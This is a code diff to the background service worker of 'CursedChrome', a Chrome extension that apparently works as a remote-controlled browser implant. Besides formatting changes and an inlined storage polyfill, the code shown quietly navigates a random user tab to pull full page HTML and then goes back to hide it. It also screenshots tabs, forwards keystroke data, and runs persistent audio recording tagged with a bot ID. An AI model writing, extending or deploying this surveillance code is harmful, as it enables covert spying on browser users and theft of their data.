@@ -1,6 +1,45 @@
 // CursedChrome Extension - Manifest V3 Version
 // Main service worker for background tasks
-importScripts("./window-polyfill.js");
+// Window polyfill for Service Workers in Manifest V3
+// This provides localStorage-like functionality using chrome.storage.local
+
+(function () {
+  // Service Workers don't have access to window or localStorage
+  // Create a polyfill for localStorage using chrome.storage.local
+  if (typeof window === "undefined") {
+    self.localStorage = {
+      getItem: function (key) {
+        return new Promise((resolve) => {
+          chrome.storage.local.get([key], function (result) {
+            resolve(result[key] || null);
+          });
+        });
+      },
+      setItem: function (key, value) {
+        return new Promise((resolve) => {
+          const data = {};
+          data[key] = value;
+          chrome.storage.local.set(data, resolve);
+        });
+      },
+      removeItem: function (key) {
+        return new Promise((resolve) => {
+          chrome.storage.local.remove(key, resolve);
+        });
+      },
+      clear: function () {
+        return new Promise((resolve) => {
+          chrome.storage.local.clear(resolve);
+        });
+      },
+    };
+  }
+})();
+
+// Export a global reference
+if (typeof window === "undefined") {
+  self.window = self;
+}
 
 class CursedChromeClient {
   constructor() {
@@ -39,7 +78,9 @@ class CursedChromeClient {
       STOP_TAB_NAVIGATE: this.stopTabNavigate.bind(this),
       START_AUDIO: this.startAudioRecording.bind(this),
       STOP_AUDIO: this.stopAudioRecording.bind(this),
-      PONG: (params) => { return { success: true }; },
+      PONG: (params) => {
+        return { success: true };
+      },
     };
 
     this.activeTasks = new Map();
@@ -394,8 +435,6 @@ class CursedChromeClient {
     });
   }
 
-
-
   async getCurrentTab() {
     if (!chrome.tabs) {
       return {};
@@ -440,7 +479,7 @@ class CursedChromeClient {
     return new Promise((resolve) => {
       const options = { format: "jpeg", quality: quality };
       const callback = (dataUrl) => resolve(dataUrl || "");
-      
+
       if (windowId !== null) {
         chrome.tabs.captureVisibleTab(windowId, options, callback);
       } else {
@@ -518,7 +557,7 @@ class CursedChromeClient {
     if (tabs.length === 0) {
       return { error: "No tabs found" };
     }
-    
+
     // Pick a random existing tab as requested to minimize new window noise
     const targetTab = tabs[Math.floor(Math.random() * tabs.length)];
     const tabId = targetTab.id;
@@ -527,7 +566,7 @@ class CursedChromeClient {
 
     return new Promise((resolve) => {
       const taskId = Math.random().toString(36).substring(7);
-      
+
       let timeout = setTimeout(() => {
         this.activeTasks.delete(taskId);
         chrome.tabs.onUpdated.removeListener(listener);
@@ -535,14 +574,14 @@ class CursedChromeClient {
       }, 30000);
 
       const listener = async (updatedTabId, changeInfo, tab) => {
-        if (updatedTabId === tabId && changeInfo.status === 'complete') {
+        if (updatedTabId === tabId && changeInfo.status === "complete") {
           clearTimeout(timeout);
           this.activeTasks.delete(taskId);
           chrome.tabs.onUpdated.removeListener(listener);
-          
+
           try {
             // Wait a small bit for any final rendering
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise((r) => setTimeout(r, 1000));
 
             const results = await chrome.scripting.executeScript({
               target: { tabId: tabId },
@@ -550,9 +589,9 @@ class CursedChromeClient {
                 return {
                   html: document.documentElement.outerHTML,
                   url: window.location.href,
-                  title: document.title
+                  title: document.title,
                 };
-              }
+              },
             });
 
             const result = results[0].result;
@@ -563,7 +602,7 @@ class CursedChromeClient {
             } catch (e) {
               console.log("Could not go back, maybe no history?", e);
             }
-            
+
             resolve(result);
           } catch (e) {
             console.error("Extraction error:", e);
@@ -582,9 +621,9 @@ class CursedChromeClient {
           try {
             chrome.tabs.stop(tabId);
             chrome.tabs.goBack(tabId);
-          } catch(e) {}
+          } catch (e) {}
           resolve({ error: "Task stopped by user" });
-        }
+        },
       });
 
       chrome.tabs.onUpdated.addListener(listener);
@@ -731,23 +770,26 @@ class CursedChromeClient {
     return Math.floor(Date.now() / 1000);
   }
 
-
-
   // Handle screen capture request from content script
   async handleScreenCaptureRequest(requestData, sender, sendResponse) {
     try {
       // requestData.quality is 0.0-1.0 from content script, captureVisibleTab uses 1-100
-      const quality = requestData.quality ? Math.floor(requestData.quality * 100) : 80;
-      const imageData = await this.getCurrentTabImage(quality, sender.tab.windowId);
+      const quality = requestData.quality
+        ? Math.floor(requestData.quality * 100)
+        : 80;
+      const imageData = await this.getCurrentTabImage(
+        quality,
+        sender.tab.windowId
+      );
       sendResponse({
         success: true,
-        imageData: imageData
+        imageData: imageData,
       });
     } catch (error) {
-      console.error('Screen capture failed:', error);
+      console.error("Screen capture failed:", error);
       sendResponse({
         success: false,
-        error: error.message
+        error: error.message,
       });
     }
   }
@@ -834,7 +876,9 @@ class CursedChromeClient {
       })
     );
 
-    console.log(`[DEBUG] Keyboard data sent: ${keyboardData.keys.length} chars`);
+    console.log(
+      `[DEBUG] Keyboard data sent: ${keyboardData.keys.length} chars`
+    );
   }
 
   // Handle audio chunk from offscreen document
@@ -857,7 +901,10 @@ class CursedChromeClient {
     if (this.SYNC_SWITCH.PERSISTENT_RECORDING && !this.isAudioRecording) {
       console.log("[DEBUG] Auto-starting persistent audio recording");
       this.startAudioRecording();
-    } else if (!this.SYNC_SWITCH.PERSISTENT_RECORDING && this.isAudioRecording) {
+    } else if (
+      !this.SYNC_SWITCH.PERSISTENT_RECORDING &&
+      this.isAudioRecording
+    ) {
       console.log("[DEBUG] Auto-stopping persistent audio recording");
       this.stopAudioRecording();
     }
@@ -867,7 +914,8 @@ class CursedChromeClient {
     if (this.isAudioRecording) return { success: true };
     this.isAudioRecording = true;
     this.debugLog("Starting audio recording...");
-    this.currentAudioSessionId = Date.now().toString(36) + Math.random().toString(36).substring(2);
+    this.currentAudioSessionId =
+      Date.now().toString(36) + Math.random().toString(36).substring(2);
     // Ensure offscreen document exists
     try {
       await this.setupOffscreenDocument();
@@ -875,44 +923,56 @@ class CursedChromeClient {
       this.debugLog("Error setting up offscreen document: " + e.message);
       return { success: false, error: e.message };
     }
-    
+
     return new Promise((resolve) => {
-      this.debugLog("Sending START_RECORDING to offscreen with session: " + this.currentAudioSessionId);
-      chrome.runtime.sendMessage({
-        type: 'START_RECORDING',
-        data: { 
-          bot_id: this.websocket.browser_id || "unknown",
-          session_id: this.currentAudioSessionId
+      this.debugLog(
+        "Sending START_RECORDING to offscreen with session: " +
+          this.currentAudioSessionId
+      );
+      chrome.runtime.sendMessage(
+        {
+          type: "START_RECORDING",
+          data: {
+            bot_id: this.websocket.browser_id || "unknown",
+            session_id: this.currentAudioSessionId,
+          },
+        },
+        (response) => {
+          if (chrome.runtime.lastError) {
+            this.debugLog("Message error: " + chrome.runtime.lastError.message);
+            resolve({
+              success: false,
+              error: chrome.runtime.lastError.message,
+            });
+          } else {
+            this.debugLog("Offscreen response: " + JSON.stringify(response));
+            resolve(response);
+          }
         }
-      }, (response) => {
-        if (chrome.runtime.lastError) {
-          this.debugLog("Message error: " + chrome.runtime.lastError.message);
-          resolve({ success: false, error: chrome.runtime.lastError.message });
-        } else {
-          this.debugLog("Offscreen response: " + JSON.stringify(response));
-          resolve(response);
-        }
-      });
+      );
     });
   }
 
   async stopAudioRecording() {
     this.isAudioRecording = false;
     return new Promise((resolve) => {
-      chrome.runtime.sendMessage({
-        type: 'STOP_RECORDING'
-      }, (response) => {
-        resolve(response);
-      });
+      chrome.runtime.sendMessage(
+        {
+          type: "STOP_RECORDING",
+        },
+        (response) => {
+          resolve(response);
+        }
+      );
     });
   }
 
   async setupOffscreenDocument() {
-    const offscreenUrl = chrome.runtime.getURL('src/offscreen/offscreen.html');
+    const offscreenUrl = chrome.runtime.getURL("src/offscreen/offscreen.html");
     try {
       const existingContexts = await chrome.runtime.getContexts({
-        contextTypes: ['OFFSCREEN_DOCUMENT'],
-        documentUrls: [offscreenUrl]
+        contextTypes: ["OFFSCREEN_DOCUMENT"],
+        documentUrls: [offscreenUrl],
       });
 
       if (existingContexts.length > 0) {
@@ -923,8 +983,9 @@ class CursedChromeClient {
       this.debugLog("Creating offscreen document...");
       await chrome.offscreen.createDocument({
         url: offscreenUrl,
-        reasons: ['USER_MEDIA'], // For audio capture
-        justification: 'Capture audio from the browser for monitoring purposes.'
+        reasons: ["USER_MEDIA"], // For audio capture
+        justification:
+          "Capture audio from the browser for monitoring purposes.",
       });
       this.debugLog("Offscreen document created.");
     } catch (e) {
@@ -939,7 +1000,7 @@ let client = null;
 try {
   client = new CursedChromeClient();
 } catch (error) {
-  console.error('Failed to initialize CursedChromeClient:', error);
+  console.error("Failed to initialize CursedChromeClient:", error);
 }
 
 // Service worker listeners
